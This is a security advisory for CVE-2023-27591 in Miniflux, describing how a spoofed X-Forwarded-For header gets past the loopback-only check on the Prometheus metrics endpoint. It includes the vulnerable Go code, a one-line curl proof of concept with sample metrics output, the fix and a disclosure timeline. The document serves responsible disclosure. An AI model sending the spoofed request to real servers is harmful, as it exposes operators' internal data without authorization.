# Unauthenticated Prometheus metrics disclosure in Miniflux via IP spoofing

## Advisory Info

- Vendor: [Miniflux](https://github.com/miniflux)
- Product: [Miniflux 2](https://github.com/miniflux/v2)
- Affected Versions: >= 2.0.24 < 2.0.43
- Patched Versions: 2.0.43
- Vendor Advisory: [https://github.com/miniflux/v2/security/advisories/GHSA-3qjf-qh38-x73v](https://github.com/miniflux/v2/security/advisories/GHSA-3qjf-qh38-x73v)
- Vendor Publication Date: 2023-03-17

## Vulnerability Info

- Weakness: [CWE-290: Authentication Bypass by Spoofing](https://cwe.mitre.org/data/definitions/290.html)
- CVE: [CVE-2023-27591](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-27591)

## Summary

Since [v2.0.24](https://github.com/miniflux/v2/releases/tag/2.0.24), Miniflux can be [configured](https://miniflux.app/docs/configuration.html#metrics-collector) to expose a `/metrics` endpoint which is suitable for ingestion by [Prometheus](https://prometheus.io). This endpoint is only accessible on the loopback range (`127.0.0.1/8`) [by default](https://github.com/miniflux/v2/blob/b2fd84e0d376a3af6329b9bb2e772ce38a25c31c/config/options.go#L71).

The `isAllowedToAccessMetricsEndpoint` check in the `httpd` service [determines](https://github.com/miniflux/v2/blob/b2fd84e0d376a3af6329b9bb2e772ce38a25c31c/service/httpd/httpd.go#L233-L235) whether the caller is permitted to access the metrics endpoint [using](https://github.com/miniflux/v2/blob/b2fd84e0d376a3af6329b9bb2e772ce38a25c31c/service/httpd/httpd.go#L225) the `ClientIP`:

```go
func isAllowedToAccessMetricsEndpoint(r *http.Request) bool {
    clientIP := net.ParseIP(request.ClientIP(r))
    for _, cidr := range config.Opts.MetricsAllowedNetworks() {
        _, network, err := net.ParseCIDR(cidr)
    // [snip]
        if network.Contains(clientIP) {
            return true
        }
    }
    return false
}
```

The `ClientIP` comes from the IP address [stored](https://github.com/miniflux/v2/blob/b2fd84e0d376a3af6329b9bb2e772ce38a25c31c/http/request/context.go#L113-L116) in the request context which is obtained at the [middleware level](https://github.com/miniflux/v2/blob/b2fd84e0d376a3af6329b9bb2e772ce38a25c31c/service/httpd/middleware.go#L18):

```go
func middleware(next http.Handler) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        clientIP := request.FindClientIP(r)
        ctx := r.Context()
        ctx = context.WithValue(ctx, request.ClientIPContextKey, clientIP)
    // [snip]
 }
```

The `FindClientIP` [method](https://github.com/miniflux/v2/blob/b2fd84e0d376a3af6329b9bb2e772ce38a25c31c/http/request/client_ip.go#L23) called by the middleware can be influenced by the user-controllable `X-Forwarded-For` and `X-Real-Ip` request headers:

```go
func FindClientIP(r *http.Request) string {
    headers := []string{"X-Forwarded-For", "X-Real-Ip"}
    for _, header := range headers {
    value := r.Header.Get(header)
    // [snip]
}
```

Since there are no `IsAuthenticated` or `IsAdminUser` checks in front of the metrics endpoint, issuing an unauthenticated HTTP request to a publicly reachable Miniflux server with the request header `X-Forwarded-For: 127.0.0.1` will pass the `isAllowedToAccessMetricsEndpoint` check and return the Prometheus metrics when `METRICS_COLLECTOR` is enabled.

## Steps to Reproduce

1. Bring up an instance of Miniflux (herein `https://miniflux`) following the [installation instructions](https://miniflux.app/docs/installation.html) ensuring that the `METRICS_COLLECTOR` configuration option is enabled.

2. Run the following curl command from another host:

```bash
curl "https://miniflux/metrics" --header "X-Forwarded-For: 127.0.0.1"
```

3. Observe that the Prometheus metrics for the Miniflux instance are returned:

```bash
# [snip]
# HELP miniflux_broken_feeds Number of broken feeds
# TYPE miniflux_broken_feeds gauge
miniflux_broken_feeds 0
# HELP miniflux_db_connections_idle The number of idle connections
# TYPE miniflux_db_connections_idle gauge
miniflux_db_connections_idle 0
# HELP miniflux_db_connections_in_use The number of connections currently in use
# TYPE miniflux_db_connections_in_use gauge
miniflux_db_connections_in_use 0
# HELP miniflux_db_connections_max_idle_closed The total number of connections closed due to SetMaxIdleConns
# TYPE miniflux_db_connections_max_idle_closed gauge
miniflux_db_connections_max_idle_closed 0
# HELP miniflux_db_connections_max_idle_time_closed The total number of connections closed due to SetConnMaxIdleTime
# TYPE miniflux_db_connections_max_idle_time_closed gauge
miniflux_db_connections_max_idle_time_closed 0
# HELP miniflux_db_connections_max_lifetime_closed The total number of connections closed due to SetConnMaxLifetime
# TYPE miniflux_db_connections_max_lifetime_closed gauge
miniflux_db_connections_max_lifetime_closed 0
# HELP miniflux_db_connections_wait_count The total number of connections waited for
# TYPE miniflux_db_connections_wait_count gauge
miniflux_db_connections_wait_count 0
# HELP miniflux_db_open_connections The number of established connections both in use and idle
# TYPE miniflux_db_open_connections gauge
miniflux_db_open_connections 0
# HELP miniflux_users Number of users
# TYPE miniflux_users gauge
miniflux_users 0
# [snip]
```

## Impact

An unauthenticated user can retrieve Prometheus metrics from a publicly reachable Miniflux instance where the `METRICS_COLLECTOR` [configuration option](https://miniflux.app/docs/configuration.html#metrics-collector) is enabled and `METRICS_ALLOWED_NETWORKS` is set to 127.0.0.1/8 (default). The [available metrics](https://github.com/miniflux/v2/blob/b2fd84e0d376a3af6329b9bb2e772ce38a25c31c/metric/metric.go) contain statistical information about the Go environment and Miniflux database.

## Recommendations

If you run a Miniflux server with the `METRICS_COLLECTOR` configuration option enabled, you should update to Miniflux version 2.0.43 or above. You are also recommended to use HTTP basic authentication with the `METRICS_USERNAME` and `METRICS_PASSWORD` options to protect the metrics endpoint or run Miniflux behind a trusted reverse proxy.

## Timeline

- 2023-03-11: Vulnerability discovery
- 2023-03-11: Advisory sent to vendor
- 2023-03-12: Vendor acknowledgment
- 2023-03-12: Vendor commits fix ([PR 1](https://github.com/miniflux/v2/pull/1744), [PR 2](https://github.com/miniflux/v2/pull/1745))
- 2023-03-17: Vendor releases v2.0.43
- 2023-03-17: Vendor public disclosure via [GitHub Security Advisory](https://github.com/miniflux/v2/security/advisories/GHSA-3qjf-qh38-x73v)
